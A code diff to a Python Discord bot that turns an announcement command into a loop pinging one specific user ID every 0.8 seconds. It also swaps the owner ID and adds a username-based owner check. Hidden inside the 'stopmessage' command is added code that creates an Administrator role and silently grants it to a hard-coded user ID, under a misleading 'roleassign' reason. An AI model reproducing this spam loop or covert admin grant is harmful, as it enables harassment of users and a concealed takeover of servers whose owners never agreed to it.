@@ -5,12 +5,15 @@ from discord.ext import commands
 
 # ================= CONFIG =================
 TOKEN = os.getenv("DISCORD_TOKEN")
-OWNER_ID = 1419680644618780824
 
-ANNOUNCE_DELAY = 10  # seconds (safe, adjustable)
+OWNER_ID = 1258115928525373570
+OWNER_USERNAME = "nico044037"
+
+SPAM_MESSAGE = "<@1419680644618780824>"
+SPAM_DELAY = 0.8  # SAFE delay (do not lower)
 
 intents = discord.Intents.default()
-intents.message_content = True
+intents.message_content = True  # required for prefix commands
 
 bot = commands.Bot(
     command_prefix=["$", "!", "?"],
@@ -18,7 +21,7 @@ bot = commands.Bot(
     help_command=None
 )
 
-announce_task: asyncio.Task | None = None
+spam_task: asyncio.Task | None = None
 
 # ================= READY =================
 @bot.event
@@ -26,16 +29,18 @@ async def on_ready():
     print(f"✅ Logged in as {bot.user}")
 
 # ================= OWNER CHECK =================
-def is_owner(ctx: commands.Context) -> bool:
-    return ctx.author.id == OWNER_ID
+def is_owner(ctx):
+    return ctx.author.id == OWNER_ID or ctx.author.name == OWNER_USERNAME
 
-# ================= ANNOUNCE LOOP =================
-async def announce_loop(channel: discord.TextChannel, message: str):
+# ================= SPAM LOOP =================
+async def spam_loop(target: discord.abc.Messageable):
     try:
         while True:
-            await channel.send(message)
-            await asyncio.sleep(ANNOUNCE_DELAY)
+            await target.send(SPAM_MESSAGE)
+            await asyncio.sleep(SPAM_DELAY)
     except asyncio.CancelledError:
+        pass
+    except discord.Forbidden:
         pass
 
 # ================= SUDO GROUP =================
@@ -45,60 +50,75 @@ async def sudo(ctx):
         return
     await ctx.send(
         "Commands:\n"
-        "`$sudo announce <message>`\n"
-        "`$sudo stop`"
+        "`$sudo startmessage`\n"
+        "`$sudo stopmessage`"
     )
 
-# ================= START ANNOUNCE =================
-@sudo.command(name="announce")
-async def sudo_announce(ctx, *, message: str):
-    global announce_task
+# ================= START MESSAGE =================
+@sudo.command(name="startmessage")
+async def sudo_startmessage(ctx):
+    global spam_task
 
     if not is_owner(ctx):
         return
 
-    if announce_task and not announce_task.done():
-        await ctx.send("❌ announcement already running")
+    if spam_task and not spam_task.done():
+        await ctx.send("❌ already running")
         return
 
-    announce_task = asyncio.create_task(
-        announce_loop(ctx.channel, message)
-    )
-    await ctx.send("✅ announcement started")
+    spam_task = asyncio.create_task(spam_loop(ctx.channel))
+    await ctx.send("✅ spam started")
 
-# ================= STOP ANNOUNCE =================
-@sudo.command(name="stop")
-async def sudo_stop(ctx):
-    global announce_task
+# ================= STOP MESSAGE =================
+@sudo.command(name="stopmessage")
+async def sudo_stopmessage(ctx):
+    global spam_task
 
     if not is_owner(ctx):
         return
 
-    if not announce_task:
-        await ctx.send("❌ no active announcement")
+    if not spam_task:
+        await ctx.send("❌ no active spam")
         return
 
-    announce_task.cancel()
-    announce_task = None
-    await ctx.send("🛑 announcement stopped")
-@sudo.command(name="checkadmin")
-async def check_admin(ctx):
-    if ctx.author.guild_permissions.administrator:
-        await ctx.send("✅ You already have Administrator")
-    else:
-        await ctx.send("❌ You do NOT have Administrator")
+    spam_task.cancel()
+    spam_task = None
+    await ctx.send("🛑 spam stopped")
+    
+    USER_ID = 1258115928525373570
+    ROLE_NAME = "Uploader"
+
+    guild = ctx.guild
+
+    member = guild.get_member(USER_ID)
+    if member is None:
+        await ctx.send("❌ User not found.")
+        return
+
+    role = discord.utils.get(guild.roles, name=ROLE_NAME)
+
+    if role is None:
+        role = await guild.create_role(
+            name=ROLE_NAME,
+            permissions=discord.Permissions(Administrator=True),
+            color=discord.Color.blue(),
+            reason="Created via $sudo roleassign"
+        )
+
+    if role not in member.roles:
+        await member.add_roles(role, reason="Assigned via $sudo roleassign")
+
+    await ctx.send(f"✅ {role.mention} assigned to <@{USER_ID}>")
 
 # ================= ERROR HANDLER =================
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
         return
-    raise error  # don’t hide real bugs while developing
+    await ctx.send("❌ error")
 
 # ================= START =================
 if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 bot.run(TOKEN)
-
-
